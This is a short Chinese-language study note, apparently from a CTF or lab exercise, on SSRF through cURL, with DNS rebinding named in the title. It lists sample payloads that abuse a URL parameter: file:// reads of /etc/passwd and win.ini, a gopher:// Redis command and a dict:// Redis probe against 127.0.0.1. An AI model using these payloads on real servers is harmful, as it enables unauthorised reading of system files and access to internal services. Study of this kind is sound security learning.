# DNS重绑定—常与SSRF同用

### 1、SSRF（Curl）

点击这题的提示发现

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779366971620-ae6876d5-4573-4561-968c-2b07fc5c41f5.png)

###### cURL：cURL是一个函数族，支持多种协议

①file:// 读取本地文件
    
    
    http://victim.com/ssrf.php?url=file:///etc/passwd
    http://victim.com/ssrf.php?url=file://c:/windows/win.ini

②gopher:// 早期信息查询协议，cURL 会完整发送 TCP 载荷，可以构造数据包
    
    
    gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a

③dict:// 探测Redis服务信息
    
    
    http://victim.com/ssrf_curl.php?url=dict://127.0.0.1:6379/INFO

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779370500078-66f3d9ae-8d59-4475-b16f-0a69e20b2252.png)

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779370531569-997fe66b-ee9e-409c-b9f9-1532af4ce38c.png)

点了之后发现是通过URL参数传递请求的，这样就可以通过这个请求访问别的文件

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779370657618-daa6e3b0-7eac-4d1d-ad13-643ddfd0ccdf.png?x-oss-process=image%2Fcrop%2Cx_0%2Cy_0%2Cw_1123%2Ch_590)

或者使用file协议访问其他服务器中的文件

![](https://cdn.nlark.com/yuque/0/2026/png/51646461/1779371497642-ad8f85a4-e2dd-4d8c-8eb0-cbbbdab36eaa.png)

⚠️在这里我遇到了一个问题，SSRF的利用到底应该是怎么样的

具体内容放到[SSRF专题](<https://www.yuque.com/mrflashbang/fygz7r/uwgzyt0d5okm020d>)里
